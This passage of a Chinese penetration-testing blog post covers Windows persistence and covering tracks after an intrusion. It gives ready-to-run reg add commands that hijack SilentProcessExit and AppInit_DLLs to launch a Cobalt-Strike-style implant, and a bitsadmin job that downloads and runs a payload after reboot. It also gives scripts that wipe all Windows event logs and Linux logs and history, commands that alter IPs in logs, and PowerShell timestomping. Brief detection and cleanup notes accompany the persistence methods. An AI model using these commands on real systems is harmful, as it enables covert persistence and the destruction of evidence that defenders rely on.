<p>其他适用的辅助功能还有：</p>
<table>
<thead>
<tr>
<th align="left"><strong>辅助功能</strong></th>
<th align="left"><strong>路径</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left">屏幕键盘</td>
<td align="left">c:\windows\system32\osk.exe</td>
</tr>
<tr>
<td align="left">放大镜</td>
<td align="left">c:\windows\system32\Magnify.exe</td>
</tr>
<tr>
<td align="left">旁白</td>
<td align="left">c:\windows\system32\Narrator.exe</td>
</tr>
<tr>
<td align="left">显示开关</td>
<td align="left">c:\windows\system32\DisplaySwitch.exe</td>
</tr>
<tr>
<td align="left">应用程序开关</td>
<td align="left">c:\windows\system32\AtBroker.exe</td>
</tr>
</tbody></table>
<p>安装了360的情况下，无法在该注册表下添加任何项。</p>
<p>(2) 检测： 查看IFEO项下的每一个子项，检查其中带debugger键的值。</p>
<p>(3) 清除： 删除异常debugger键。</p>
<h3 id="3）进程退出静默执行："><a href="#3）进程退出静默执行：" class="headerlink" title="3）进程退出静默执行："></a>3）进程退出静默执行：</h3><p>(1) 原理： 注册表HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit可以添加程序退出时静默执行的程序，我们可以添加常见程序到该注册表下实现权限维持。</p>
<p>这种方式是IEFO映像劫持的进阶操作。</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot;</span> /v GlobalFlag /t REG\_DWORD /d 512</span><br><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot;</span> /v ReportingMode /t REG\_DWORD /d 1</span><br><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot;</span> /v MonitorProcess /t REG\_SZ /d <span class="hljs-string">&quot;c:\cs\cs.exe&quot;</span></span><br></code></pre></td></tr></table></figure>

<p>打开记事本并关闭窗口后，主机上线。</p>
<p>这里有个点，如果是关闭窗口的方式反弹回来的是普通权限，如果是通过任务管理器结束任务的方式反弹回来的是管理员权限。</p>
<p>windows server 2008 r2 standard：</p>
<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/041.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/042.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/043.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p>win 10：</p>
<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/044.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/045.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p>(2) 检测： 查看HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit下是否存在异常子项，默认下面是没有任何项的。</p>
<p>(3) 清除： 删除存在异常的子项。</p>
<h3 id="4）进程注入之AppInit-DLLs注册表项"><a href="#4）进程注入之AppInit-DLLs注册表项" class="headerlink" title="4）进程注入之AppInit_DLLs注册表项:"></a>4）进程注入之AppInit_DLLs注册表项:</h3><p>测试过程中，使用命令添加注册表项失败，winser08和win10均无法通过命令添加注册表项。</p>
<p>(1) 原理：User32.dll被加载到进程时，会获取HKEY_LOCAL_MACHINE\Software\Mircosoft\Windows NT\CurrentVersion\Windows\Appinit_Dlls注册表项。若有值，则调用LoadLibrary() API加载Appinit_Dlls制定的DLL，只会影响加载了user32.dll的进程。</p>
<p>windows server 2008 r2 standard：</p>
<p>设置Appinit_Dlls的值为恶意DLL路径，设置LoadAppInit_DLLs的值为1，设置RequireSignedAppInit_DLLs为0：</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY\_LOCAL\_MACHINE\SOFTWARE\Mircosoft\Windows NT\CurrentVersion\Windows&quot;</span> /v Appinit\_Dlls /t REG\_SZ /d <span class="hljs-string">&quot;c:\cs.dll&quot;</span> /f</span><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY\_LOCAL\_MACHINE\SOFTWARE\Mircosoft\Windows NT\CurrentVersion\Windows&quot;</span> /v LoadAppInit\_DLLs /t REG\_DWORD /d 0x1 /f</span><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY\_LOCAL\_MACHINE\SOFTWARE\Mircosoft\Windows NT\CurrentVersion\Windows&quot;</span> /v RequireSignedAppInit\_DLLs /t REG\_DWORD /d 0x0 /f</span><br></code></pre></td></tr></table></figure>

<p>启动cmd、计算器即可触发。</p>
<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/046.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/047.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p>win10：</p>
<p>win10下没有RequireSignedAppInit_DLLs键，只需设置Appinit_Dlls的值为恶意DLL路径，设置LoadAppInit_DLLs的值为1即可。</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY\_LOCAL\_MACHINE\SOFTWARE\Mircosoft\Windows NT\CurrentVersion\Windows&quot;</span> /v Appinit\_Dlls /t REG\_SZ /d <span class="hljs-string">&quot;c:\cs.dll&quot;</span> /f</span><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY\_LOCAL\_MACHINE\SOFTWARE\Mircosoft\Windows NT\CurrentVersion\Windows&quot;</span> /v LoadAppInit\_DLLs /t REG\_DWORD /d 0x1 /f</span><br></code></pre></td></tr></table></figure>

<p>修改注册表后，每次只要执行需要调用user32.dll的程序都会加载恶意dll。</p>
<p>(2) 检测： 查看HKEY_LOCAL_MACHINE\Software\Mircosoft\Windows NT\CurrentVersion\Windows\Appinit_Dlls是否有异常dll值。</p>
<p>(3) 清除： 删除注册表项键值。</p>
<h3 id="5）bits文件传输"><a href="#5）bits文件传输" class="headerlink" title="5）bits文件传输:"></a>5）bits文件传输:</h3><p>(1) 原理：bits，后台智能传输服务，主要利用网络闲暇时间在后台完成文件的同步或传输，智能的地方就是不会影响其他程序的网络带宽，并且支持在重启&#x2F;重新建立网络连接后继续传输。bitsadmin是bits的管理工具，默认windows自带，而bitsadmin有一个参数&#x2F;SetNotityCmdline：</p>
<p>这个参数可以执行程序，利用这一点就可以实现恶意行为。再利用bitsadmin的未完成状态任务重启之后继续执行的特点，实现持久化。</p>
<p>windows server 2008 r2 sp1：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">bitsadmin /create test4<br>bitsadmin /addfile test4 http://127.0.0.1/cs.exe c:\user\<span class="hljs-built_in">test</span>\cs1.exe <span class="hljs-comment"># 文件下载可以是任意文件</span><br>bitsadmin /SetNotityCmdLine test4 <span class="hljs-string">&quot;C:\windows\system32\cmd.exe&quot;</span> <span class="hljs-string">&quot;cmd.exe&quot;</span> /c c:\user\<span class="hljs-built_in">test</span>\cs.exe <span class="hljs-comment"># 这里是要执行的命令，可以是一句话上线木马，也可以执行服务器上的某个木马文件</span><br>bitsadmin /resume test4 <span class="hljs-comment"># 启动任务</span><br></code></pre></td></tr></table></figure>

<p>服务器重启后，大约1分钟左右，bits任务就会被执行。</p>
<p>win10：</p>
<p>重启之后，快的情况下立马上线，慢的情况下2分钟左右主机上线。</p>
<p>(2) 检测： 查看bits任务：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bitsadmin /list /verbos /allusers <span class="hljs-comment"># 需要管理员权限</span><br></code></pre></td></tr></table></figure>

<p>可以看到任务执行的命令。</p>
<p>(3) 清除： 取消bits任务：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bitsadmin /cancel test4<br></code></pre></td></tr></table></figure>

<ol>
<li><h6 id="清理痕迹"><a href="#清理痕迹" class="headerlink" title="清理痕迹"></a><strong>清理痕迹</strong></h6><p><strong>痕迹清理：</strong></p>
<p>在我们做完一系列的内网渗透操作后，必然会留下一些蛛丝马迹，因此我们需要给自己” 擦屁股 “。</p>
<p>一键清理痕迹的脚本：（见github）<br>Windows 日志管理工具 wevtutil.exe</p>
<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/048.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p>wevtutil 搭配 for 循环清除所有日志</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">for</span> /F <span class="hljs-string">&quot;tokens=\*&quot;</span> %a in (<span class="hljs-string">&#x27;wevtutil.exe el&#x27;</span>) DO wevtutil.exe cl <span class="hljs-string">&quot;%a&quot;</span><br></code></pre></td></tr></table></figure>

<p>Powershell 批量删日志</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">wevtutil el | <span class="hljs-built_in">Foreach-Object</span> &#123;<span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;Clearing <span class="hljs-variable">$</span>\_&quot;</span>; wevtutil cl <span class="hljs-string">&quot;<span class="hljs-variable">$</span>\_&quot;</span>&#125;<br></code></pre></td></tr></table></figure>

<p>加载运行 powershell 脚本删除日志</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell –<span class="hljs-built_in">exec</span> bypass –Command <span class="hljs-string">&quot;&amp; &#123;Import-Module &#x27;C:\Invoke-Phant0m.ps1&#x27;;Invoke-Phant0m&#125;&quot;</span><br></code></pre></td></tr></table></figure>

<p>github地址：<a target="_blank" rel="noopener" href="https://github.com/gouduyao/Invoke-Phant0m">https://github.com/gouduyao/Invoke-Phant0m</a></p>
<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/049.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p> Linux 日志处理<br>history 命令的清除</p>
<p>history -c  # 删除内存中的所有命令历史</p>
<p>history -r  # 删除当前会话历史记录</p>
<p>rm .bash_history   #删除历史文件中的内容</p>
<p>HISTZISE&#x3D;0          #通过设置历史命令条数来清除所有历史记录</p>
<p>系统日志：</p>
<img src="/2024/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/050.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
<p>linux 日志文件：</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs stata">/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">run</span>/utmp 记录现在登入的用户<br><br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/wtmp 记录用户所有的登入和登出<br><br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/lastlog 记录每一个用户最后登入时间<br><br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/btmp 记录错误的登入尝试<br><br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/auth.<span class="hljs-keyword">log</span> 需要身份确认的操作<br><br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/secure 记录安全相关的日志信息<br><br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/maillog 记录邮件相关的日志信息<br><br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/message 记录系统启动后的信息和错误日志<br><br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/cron 记录定时任务相关的日志信息<br><br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/spooler 记录UUCP和<span class="hljs-keyword">news</span>设备相关的日志信息<br><br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/<span class="hljs-keyword">boot</span>.<span class="hljs-keyword">log</span> 记录守护进程启动和停止相关的日志消息<br></code></pre></td></tr></table></figure>

<p>完全删除日志文件：</p>
<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sas">cat /dev/<span class="hljs-keyword">null</span> &gt; <span class="hljs-keyword">filename</span><br><br>: &gt; <span class="hljs-keyword">filename</span><br><br>&gt; <span class="hljs-keyword">filename</span><br><br>echo <span class="hljs-string">&quot;&quot;</span> &gt; <span class="hljs-keyword">filename</span><br><br>echo &gt; <span class="hljs-keyword">filename</span><br></code></pre></td></tr></table></figure>

<p>针对性删除日志文件：</p>
<p>删除当天日志</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sed</span>  -i <span class="hljs-string">&#x27;/当天日期/&#x27;</span>d  filename<br></code></pre></td></tr></table></figure>

<p>篡改日志文件：</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">将所有<span class="hljs-number">170.170.64</span>.<span class="hljs-number">17</span>ip替换为<span class="hljs-number">127.0.0.1</span><br><br>sed -i &#x27;s/<span class="hljs-number">170.170.64.17</span>/<span class="hljs-number">127.0.0.1</span>/g&#x27;<br></code></pre></td></tr></table></figure>

<p>一键清除脚本：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/usr/bin/bash</span><br><br><span class="hljs-built_in">echo</span> &gt; /var/log/syslog<br><br><span class="hljs-built_in">echo</span> &gt; /var/log/messages<br><br><span class="hljs-built_in">echo</span> &gt; /var/log/httpd/access\_log<br><br><span class="hljs-built_in">echo</span> &gt; /var/log/httpd/error\_log<br><br><span class="hljs-built_in">echo</span> &gt; /var/log/xferlog<br><br><span class="hljs-built_in">echo</span> &gt; /var/log/secure<br><br><span class="hljs-built_in">echo</span> &gt; /var/log/auth.log<br><br><span class="hljs-built_in">echo</span> &gt; /var/log/user.log<br><br><span class="hljs-built_in">echo</span> &gt; /var/log/wtmp<br><br><span class="hljs-built_in">echo</span> &gt; /var/log/lastlog<br><br><span class="hljs-built_in">echo</span> &gt; /var/log/btmp<br><br><span class="hljs-built_in">echo</span> &gt; /var/run/utmp<br><br><span class="hljs-built_in">rm</span> ~/./bash\_history<br><br><span class="hljs-built_in">history</span> -c<br></code></pre></td></tr></table></figure>

<p>其他小技巧：<br>   <strong>Powershell 清除系统日志：</strong></p>
<p>当我们做了一些操作都会记录到时间查看器里，而下面的 Powershell 就可清除相关日志：</p>
</li>
</ol>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">PowerShell</span> <span class="hljs-operator">-</span><span class="hljs-variable">Command</span> <span class="hljs-string">&quot;&amp; &#123;Clear-Eventlog -Log Application,System,Security&#125;&quot;</span><br><br><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">WinEvent</span> <span class="hljs-operator">-</span><span class="hljs-variable">ListLog</span> <span class="hljs-built_in">Application</span><span class="hljs-operator">,</span><span class="hljs-variable">Setup</span><span class="hljs-operator">,</span><span class="hljs-variable">Security</span> <span class="hljs-operator">-</span><span class="hljs-variable">Force</span> <span class="hljs-operator">|</span> <span class="hljs-operator">%</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-variable">Wevtutil</span><span class="hljs-operator">.</span><span class="hljs-variable">exe</span> <span class="hljs-variable">cl</span> <span class="hljs-variable">$</span>\<span class="hljs-type">_</span><span class="hljs-operator">.</span><span class="hljs-variable">Logname</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>

<p><strong>Powershell 修改文件时间戳：</strong><br>   有时候我们在登陆目标桌面后，根据需求可能会动用目标主机上的文件或者文件夹，而一些管理员很久都不会登陆一次主机；设想当管理员一上线看到自己的文件夹日期有异常，是否会怀疑？</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">Function</span> <span class="hljs-title">edit</span>\<span class="hljs-title">_time</span><span class="hljs-params">(<span class="hljs-variable">$path</span>)</span></span>&#123;<span class="hljs-variable">$date1</span> =<span class="hljs-built_in">Get-ChildItem</span> | <br><br><span class="hljs-built_in">Select</span> LastWriteTime|<span class="hljs-built_in">Get-Random</span>;<span class="hljs-variable">$date2</span> =<span class="hljs-built_in">Get-ChildItem</span> |<br><br><span class="hljs-built_in">Select</span> LastWriteTime|<span class="hljs-built_in">Get-Random</span>;<span class="hljs-variable">$date3</span> =<span class="hljs-built_in">Get-ChildItem</span> |<br><br><span class="hljs-built_in">Select</span> LastWriteTime|<span class="hljs-built_in">Get-Random</span>;<span class="hljs-variable">$</span>(<span class="hljs-built_in">Get-Item</span> <span class="hljs-variable">$path</span>).lastaccesstime=<span class="hljs-variable">$date1</span>.LastWriteTime;<br><br><span class="hljs-variable">$</span>(<span class="hljs-built_in">Get-Item</span> <span class="hljs-variable">$path</span>).creationtime=<span class="hljs-variable">$date2</span>.LastWriteTime ;<br><br><span class="hljs-variable">$</span>(<span class="hljs-built_in">Get-Item</span> <span class="hljs-variable">$path</span>).lastwritetime=<span class="hljs-variable">$date3</span>.LastWriteTime&#125;;<br><br>edit\_time(<span class="hljs-string">&quot;C:\Users\saulGoodman\Desktop\工具包\pass.txt&quot;</span>)<br></code></pre></td></tr></table></figure>



<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03  总结"></a><strong>0x03  总结</strong></h2><p>   插曲一下关于设置代理的常用工具<br> SOCKS代理<br>   我们攻击机一般与被攻击机处于不同的局域网，不能互相通信，所以我们要搭建代理，利用一台能上外网的主机作为跳板，攻击机能与被攻击机的内网正常通信</p>
<p>   代理分正向代理和反向代理，正向代理就是攻击机去主动访问被攻击机，反向代理反之</p>
<p>   在vps上设置好服务端，把客户端上传到可以访问外网的被攻击机，本地攻击机设置socks代理</p>
<h4 id="Frp："><a href="#Frp：" class="headerlink" title="Frp："></a>Frp：</h4><p>   下载地址：<a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p>
<h4 id="Ew："><a href="#Ew：" class="headerlink" title="Ew："></a>Ew：</h4><p>   下载地址：<a target="_blank" rel="noopener" href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p>
<h4 id="Nps："><a href="#Nps：" class="headerlink" title="Nps："></a>Nps：</h4><p>   下载地址：<a target="_blank" rel="noopener" href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/" class="category-chain-item">内网渗透思路</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="print-no-link">#内网渗透</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>内网渗透总结</div>
      <div>http://aqiao-jashell.github.io/2024/07/26/内网渗透总结/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>CNAQ</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年7月26日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2025/04/15/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E3%80%8C%E4%B8%80%E3%80%8D-java-SE%E5%9F%BA%E7%A1%80/" title="Java代码审计基础知识「一」-- java SE基础">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Java代码审计基础知识「一」-- java SE基础</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/06/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" title="命令执行漏洞总结">
                        <span class="hidden-mobile">命令执行漏洞总结</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量 
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客数 
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>





